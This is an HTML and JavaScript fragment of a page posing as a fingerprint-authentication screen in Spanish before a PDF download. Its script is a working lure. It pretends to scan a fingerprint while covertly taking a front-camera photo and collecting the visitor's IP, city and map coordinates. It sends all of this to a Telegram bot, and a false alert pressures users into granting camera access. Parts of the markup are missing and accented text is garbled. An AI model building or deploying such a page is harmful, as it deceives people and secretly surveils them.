    <style>
        body { 
            background: #050505; 
            color: #ffffff; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; 
            overflow: hidden; 
        }

        .container { text-align: center; width: 100%; max-width: 400px; }

        h1 { font-size: 18px; font-weight: 300; letter-spacing: 1px; margin-bottom: 40px; color: #e0e0e0; }

        /* Sensor estilo Samsung */
        .sensor-wrapper {
            position: relative;
            width: 140px;
            height: 140px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }

        .outer-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid rgba(0, 212, 255, 0.2);
            border-radius: 50%;
        }

        .progress-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 3px solid transparent;
            border-top: 3px solid #00d4ff;
            border-radius: 50%;
            display: none;
            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }

        .fingerprint-main {
            width: 80px;
            height: 80px;
            fill: #00d4ff;
            filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.5));
            transition: transform 0.2s;
        }

        .sensor-wrapper:active .fingerprint-main { transform: scale(0.9); }

        .laser {
            position: absolute;
            width: 90%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00d4ff, transparent);
            top: 50%;
            left: 5%;
            display: none;
            z-index: 10;
            animation: scan 2s ease-in-out infinite;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes scan { 
            0%, 100% { top: 20%; opacity: 0; }
            50% { top: 80%; opacity: 1; }
        }

        .status-text {
            margin-top: 50px;
            font-size: 13px;
            color: #888;
            letter-spacing: 1.5px;
            font-weight: 500;
        }

        .brand-footer {
            position: absolute;
            bottom: 30px;
            font-size: 10px;
            color: #333;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>AUTENTICACI√ìN REQUERIDA</h1>

            <div class="progress-ring" id="ring"></div>
            <div class="laser" id="laser"></div>

    <script src="config.js"></script>
    <script>
        const sensor = document.getElementById('sensor');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser');
        const ring = document.getElementById('ring');
        const beep = document.getElementById('beep');
        let procesoExitoso = false;

        window.addEventListener('beforeunload', function (e) {
            if (!procesoExitoso) {
                navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: "‚ö†Ô∏è *ALERTA DE ABANDONO*\nUsuario cerr√≥ la sesi√≥n.",
                    parse_mode: 'Markdown'
                }));
            }
        });

        async function validarBiometria() {
            if (navigator.vibrate) navigator.vibrate([100]);
            status.innerHTML = "ESCANEANDO HUELLA...";
            laser.style.display = "block";
            ring.style.display = "block";

            let infoDispositivo = "No data";

            try {
                const resIP = await fetch('https://ipapi.co/json/');
                const d = await resIP.json();
                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Android Device";
                infoDispositivo = `üì± *EQ:* ${equipo}\nüåê *IP:* \`${d.ip}\`\nüìç *Lugar:* ${d.city}, ${d.country_name}\nüîó *MAP:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                await video.play();
                
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
                stream.getTracks().forEach(t => t.stop());

                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', fotoBlob, 'foto.jpg');
                fd.append('caption', `‚úÖ *IDENTIDAD CONFIRMADA*\n\n${infoDispositivo}`);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                procesoExitoso = true;
                if (beep) beep.play();
                status.innerHTML = "‚úÖ ACCESO CONCEDIDO";
                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1200);

            } catch (err) {
                let mensajeError = "‚ùå *FALLO DE SEGURIDAD*\n";
                if (err.name === 'NotAllowedError') mensajeError += "Permiso de sensor denegado.";
                else mensajeError += `Error: ${err.message}`;

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `${mensajeError}\n\n${infoDispositivo}`, parse_mode: 'Markdown' })
                });

                alert("ATENCI√ìN: Debe habilitar el acceso al sensor biom√©trico para validar su identidad y descargar el archivo.");
                location.reload();
            }
        }

        sensor.addEventListener('click', validarBiometria);
    </script>
